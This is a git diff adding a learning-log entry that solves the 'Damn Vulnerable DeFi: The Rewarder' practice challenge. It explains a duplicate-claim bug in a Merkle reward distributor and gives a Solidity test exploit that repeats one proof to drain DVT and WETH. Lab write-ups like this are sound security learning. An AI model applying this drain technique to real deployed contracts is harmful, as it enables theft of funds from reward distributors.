@@ -665,7 +665,81 @@ contract FreeRiderExploit{
 }
 ```
 
+### 2024.09.07
 
+- Damn Vulnerable DeFi: The Rewarder
+
+#### The Rewarder
+
+Issue:
+
+I think the biggest issue is that the claimed mark only updated while the last claim, which allows duplicate claim:
+```solidity
+            // for the last claim
+            if (i == inputClaims.length - 1) {
+                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+            }
+```
+
+Solve:
+
+```solidity
+    function test_theRewarder() public checkSolvedByPlayer {
+        console.log("****", player);
+        uint256 playerDVT = 11524763827831882;
+        uint256 playerWETH = 1171088749244340;
+
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+
+        IERC20[] memory inputTokens = new IERC20[](2);
+        inputTokens[0] = IERC20(address(dvt));
+        inputTokens[1] = IERC20(address(weth));
+
+        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
+        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
+
+        console.log(expectedDVTLeft, expectedWETHLeft);
+
+        uint256 dvtTxCount = expectedDVTLeft/playerDVT;
+        uint256 wethTxCount = expectedWETHLeft/playerWETH;
+        uint256 txTotal = dvtTxCount + wethTxCount;
+
+        Claim[] memory inputClaims = new Claim[](txTotal);
+
+
+        for(uint i = 0; i < dvtTxCount; i++){
+            inputClaims[i] = Claim({
+                batchNumber: 0, 
+                amount: playerDVT,
+                tokenIndex: 0, // dvt
+                proof: merkle.getProof(dvtLeaves, 188) 
+            });
+        }
+
+        for(uint i = dvtTxCount; i < txTotal; i++){
+            inputClaims[i] = Claim({
+                batchNumber: 0, 
+                amount: playerWETH,
+                tokenIndex: 1, // weth
+                proof: merkle.getProof(wethLeaves, 188) 
+            });
+        }
+
+        distributor.claimRewards(
+            inputClaims, 
+            inputTokens
+        );
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+    }
+```
 
 
 <!-- Content_END -->
